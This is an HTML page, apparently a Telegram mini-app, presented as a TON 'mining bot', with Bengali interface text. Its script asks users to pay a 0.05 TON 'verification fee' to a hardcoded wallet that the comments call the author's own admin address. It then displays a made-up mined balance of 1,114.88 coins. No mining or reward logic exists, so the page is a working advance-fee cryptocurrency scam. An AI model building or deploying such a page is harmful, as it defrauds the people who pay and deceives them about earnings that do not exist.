<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mining Bot</title>
    <!-- TON Connect SDK Library -->
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 450px; background: #121824; padding: 20px; border-radius: 16px; min-height: 100vh; position: relative; }
        
        /* Vault Header */
        .vault-card { background: linear-gradient(135deg, #059669 0%, #10b981 100%); padding: 20px; border-radius: 16px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.2); }
        .vault-title { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #a7f3d0; font-weight: bold; }
        .vault-balance { font-size: 32px; font-weight: 800; margin: 10px 0 5px 0; }
        .vault-usd { font-size: 14px; color: #d1fae5; margin-bottom: 15px; }
        .vault-stats { display: flex; justify-content: space-between; background: rgba(0, 0, 0, 0.2); padding: 12px; border-radius: 10px; }
        .stat-item { text-align: center; }
        .stat-label { font-size: 11px; color: #a7f3d0; }
        .stat-val { font-size: 14px; font-weight: bold; }

        /* Verification Card */
        .verify-card { background: #1e293b; border: 1px solid #334155; border-radius: 14px; padding: 16px; margin-bottom: 20px; }
        .verify-title { color: #f59e0b; font-size: 16px; font-weight: bold; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
        .verify-desc { font-size: 13px; color: #94a3b8; line-height: 1.4; margin-bottom: 15px; }
        .pay-btn { width: 100%; background: #0088cc; color: #ffffff; border: none; padding: 14px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
        .pay-btn:hover { background: #0077b5; }
        
        /* Ton Connect Container */
        #ton-connect-button { display: flex; justify-content: center; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="app-container">
    <h2 style="margin-bottom: 15px; font-size: 20px;">Vault & Mining</h2>

    <!-- TON Connect Button (Wallet Connect করার জন্য) -->
    <div id="ton-connect-button"></div>

    <!-- Main Balance Card -->
    <div class="vault-card">
        <div class="vault-title">Combined Holding · Level 1</div>
        <div class="vault-balance" id="coinBalance">0.00</div>
        <div class="vault-usd" id="usdBalance">≈ $0.00</div>
        <div class="vault-stats">
            <div class="stat-item">
                <div class="stat-label">In-app</div>
                <div class="stat-val" id="inAppVal">0.00</div>
            </div>
            <div class="stat-item">
                <div class="stat-label">On-chain</div>
                <div class="stat-val">0 TON</div>
            </div>
        </div>
    </div>

    <!-- Verification Section -->
    <div class="verify-card">
        <div class="verify-title">🛡️ Activate Mining (0.05 TON)</div>
        <div class="verify-desc">
            মাইনিং ফিচার চালুকরণ এবং রিওয়ার্ড প্রাপ্তির জন্য আপনার TON ওয়ালেট থেকে <b>0.05 TON</b> ভেরিফিকেশন ফি প্রদান করুন।
        </div>
        <button class="pay-btn" id="verifyPayBtn">Pay 0.05 TON & Verify</button>
    </div>
</div>

<script>
    // ১. TON Connect সেটআপ
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://raw.githubusercontent.com/ton-community/tutorials/main/03-client/test-manifest.json',
        buttonRootId: 'ton-connect-button'
    });

    // ২. আপনার ব্যক্তিগত TON ওয়ালেট অ্যাড্রেস
    const MY_ADMIN_WALLET = "UQB_AN7rPGPHfILzofTCSEhulZLQN9qu443O3fCaFFdk6PkW";

    // ৩. পেমেন্ট ও ভেরিফিকেশন লজিক
    document.getElementById('verifyPayBtn').addEventListener('click', async () => {
        // ওয়ালেট কানেক্ট আছে কিনা চেক করা
        if (!tonConnectUI.connected) {
            alert("অনুগ্রহ করে প্রথমে আপনার TON ওয়ালেট কানেক্ট (Connect Wallet) করুন!");
            return;
        }

        // লেনদেনের মেসেজ অবজেক্ট (0.05 TON = 50000000 nanotons)
        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [
                {
                    address: MY_ADMIN_WALLET,
                    amount: "50000000" 
                }
            ]
        };

        try {
            // ট্রানজেকশন রিকোয়েস্ট পাঠানো
            const result = await tonConnectUI.sendTransaction(transaction);
            alert("সফলভাবে 0.05 TON জমা হয়েছে! আপনার মাইনিং ভেরিফিকেশন সম্পন্ন হয়েছে।");
            
            // ভেরিফিকেশন সফল হলে ব্যালেন্স আপডেট করা
            document.getElementById('inAppVal').innerText = "1,114.88";
            document.getElementById('coinBalance').innerText = "1,114.88";
            document.getElementById('usdBalance').innerText = "≈ $1.94";

        } catch (e) {
            console.error(e);
            alert("পেমেন্ট অসম্পূর্ণ থেকে গেছে বা বাতিল করা হয়েছে।");
        }
    });
</script>

</body>
</html>
